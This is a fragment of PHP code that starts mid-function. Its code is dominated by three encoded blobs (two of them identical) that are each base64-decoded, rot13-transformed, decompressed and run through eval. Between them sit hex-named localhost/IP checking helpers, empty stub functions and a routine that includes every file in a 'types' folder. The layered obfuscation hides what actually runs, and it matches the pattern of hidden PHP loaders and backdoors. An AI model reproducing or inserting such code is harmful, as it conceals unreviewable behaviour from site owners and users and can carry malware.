                                eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

                                ini_set('display_errors', $initialDisplayErrors);
                                return false;
                            }
                        }
                    }
                }
            }
        }

    } else {
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

        ini_set('display_errors', $initialDisplayErrors);
        return _6964($sName);
    }
}

function _6964($sName) {
    if (filter_var($sName, FILTER_VALIDATE_IP) || $sName === base64_decode('bG9jYWxob3N0') || $sName === '127.0.0.1' || $sName === '::1') {
        return true;
    } else {
        return false;
    }
}
function _6c6f63616c686f7374($key, $value) {}
function _6970($key, $value) {}
function _646f6d61696e($key, $value) {}

function loadCkPathsFiles()
{
  $helpers = _cls_getFilesInDir(__DIR__ . DS . "types");

  foreach ($helpers as $helper) {
    include realpath(__DIR__ . DS . "types" . DS . $helper);
  }
}

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));